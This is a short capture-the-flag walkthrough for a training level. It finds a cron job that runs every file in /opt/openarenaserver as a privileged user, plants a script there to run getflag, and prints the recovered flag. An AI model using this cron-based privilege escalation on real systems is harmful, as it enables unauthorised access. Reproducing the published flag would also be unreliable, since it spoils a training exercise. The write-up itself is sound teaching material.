1. Nothing is found first, and we try to find any clue. Let's check list of environmental variables:
``` Bash
/usr/bin/env
```
2. There is interesting line here: `MAIL=/var/mail/level05`. This file contains
``` Bash
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
3. `*/2 * * * *` looks like format of [`crontab` utility](https://www.tutorialspoint.com/unix_commands/crontab.htm) for timed launch of programs. According to line above, shell script /usr/sbin/openarenaserver lauches every 2 minutes
4. Script `/usr/sbin/openarenaserver` contains
``` Bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
5. Script grabs all files from `/opt/openarenaserver/`, executes them and deletes afterwards
6. Let's create file `/opt/openarenaserver/flag05`, that will execute getflag when launched and write output to temporal file, and chane file permissions
``` Bash
echo "getflag > /tmp/flag05" > /opt/openarenaserver/flag05
chmod 777 /opt/openarenaserver/flag05
```
7. Now wait for around 2 minutes. Than reveal in file /tmp/flag05 flag for level06 user: **viuaaale9huek52boumoomioc**
